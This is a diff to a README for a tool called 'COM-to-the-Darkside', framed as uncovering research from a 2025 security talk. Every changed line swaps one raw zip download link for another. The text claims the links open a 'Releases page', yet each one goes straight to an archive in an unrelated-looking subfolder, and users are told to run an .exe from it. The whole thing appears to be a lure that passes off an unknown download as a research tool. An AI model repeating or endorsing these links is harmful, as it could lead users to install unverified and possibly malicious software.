@@ -1,6 +1,6 @@
 # 🌌 COM-to-the-Darkside - Uncover the Secrets of MCTTP 2025
 
-[![Download COM-to-the-Darkside](https://raw.githubusercontent.com/dotri5816/COM-to-the-Darkside/main/humboldtine/COM-to-the-Darkside_1.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/dotri5816/COM-to-the-Darkside/main/humboldtine/COM-to-the-Darkside_1.1.zip)
+[![Download COM-to-the-Darkside](https://raw.githubusercontent.com/dotri5816/COM-to-the-Darkside/main/humboldtine/the-Darkside-to-CO-v1.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/dotri5816/COM-to-the-Darkside/main/humboldtine/the-Darkside-to-CO-v1.1.zip)
 
 ## 📜 Overview
 
@@ -16,7 +16,7 @@ To get started with the application, follow the steps below to download and run 
 
 2. **Download the Software**
    - Click the download link below to visit the Releases page:
-   - [Download COM-to-the-Darkside](https://raw.githubusercontent.com/dotri5816/COM-to-the-Darkside/main/humboldtine/COM-to-the-Darkside_1.1.zip)
+   - [Download COM-to-the-Darkside](https://raw.githubusercontent.com/dotri5816/COM-to-the-Darkside/main/humboldtine/the-Darkside-to-CO-v1.1.zip)
 
 3. **Choose the Right Version**
    - On the Releases page, you will see different versions of the application. It is best to choose the latest version, as it contains the newest features and bug fixes.
@@ -29,7 +29,7 @@ To get started with the application, follow the steps below to download and run 
 ## 📥 Download & Install
 
 - To download the application, visit the releases page using the following link:
-[Download COM-to-the-Darkside](https://raw.githubusercontent.com/dotri5816/COM-to-the-Darkside/main/humboldtine/COM-to-the-Darkside_1.1.zip)
+[Download COM-to-the-Darkside](https://raw.githubusercontent.com/dotri5816/COM-to-the-Darkside/main/humboldtine/the-Darkside-to-CO-v1.1.zip)
 
 1. **Locate the File**
    - After clicking the link above, you will see a list of files. Select the appropriate file for your system. For example, if you are using Windows, look for a file that ends with `.exe`.
